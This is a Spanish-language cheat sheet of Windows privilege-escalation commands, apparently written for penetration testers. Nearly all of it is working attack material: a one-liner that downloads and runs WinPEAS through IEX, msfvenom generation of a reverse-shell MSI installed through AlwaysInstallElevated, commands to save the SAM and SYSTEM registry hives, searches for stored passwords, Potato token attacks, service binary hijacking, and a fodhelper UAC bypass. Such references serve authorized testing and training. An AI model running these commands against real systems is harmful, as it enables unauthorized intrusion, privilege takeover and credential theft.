# Windows Privilege Escalation

## Enumeración Inicial

### Sistema

```powershell
# Info del sistema
systeminfo
hostname
whoami /all

# Usuarios y grupos
net user
net localgroup Administrators
```

### Herramientas Automáticas

=== "WinPEAS"
    ```powershell
    # Descargar y ejecutar
    IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')
    ```

=== "PowerUp"
    ```powershell
    Import-Module .\PowerUp.ps1
    Invoke-AllChecks
    ```

## Vectores de Escalada

### Servicios

```powershell
# Listar servicios
Get-Service
sc query state= all

# Permisos de servicios
accesschk.exe /accepteula -uwcqv "Users" *

# Modificar binario de servicio
sc config [service] binpath= "C:\path\to\payload.exe"
sc stop [service]
sc start [service]
```

### Unquoted Service Path

```powershell
# Buscar rutas sin comillas
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
```

!!! example "Explotación"
    Si el path es `C:\Program Files\Service Folder\binary.exe`
    
    Colocar payload en `C:\Program.exe` o `C:\Program Files\Service.exe`

### AlwaysInstallElevated

```powershell
# Verificar
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Explotar con msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=443 -f msi -o shell.msi
msiexec /quiet /qn /i shell.msi
```

### Credenciales Guardadas

```powershell
# Credenciales en registro
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# Archivos de configuración
findstr /si password *.txt *.ini *.config

# SAM y SYSTEM (si son accesibles)
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
```

### Token Impersonation

```powershell
# Verificar privilegios
whoami /priv
```

!!! warning "Privilegios explotables"
    - `SeImpersonatePrivilege` → Potato attacks
    - `SeAssignPrimaryToken` → Token manipulation
    - `SeBackupPrivilege` → Read any file
    - `SeRestorePrivilege` → Write any file

=== "PrintSpoofer"
    ```powershell
    PrintSpoofer.exe -i -c cmd
    ```

=== "GodPotato"
    ```powershell
    GodPotato.exe -cmd "cmd /c whoami"
    ```

### Scheduled Tasks

```powershell
# Listar tareas
schtasks /query /fo LIST /v

# Buscar scripts modificables
icacls C:\path\to\script.bat
```

## Técnicas Adicionales

### DLL Hijacking

```powershell
# Buscar DLLs faltantes con Process Monitor
# Filtrar por "NAME NOT FOUND" y ".dll"
```

### UAC Bypass

```powershell
# Verificar nivel de UAC
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System

# fodhelper bypass
reg add HKCU\Software\Classes\ms-settings\shell\open\command /d "cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_SZ /f
fodhelper.exe
```
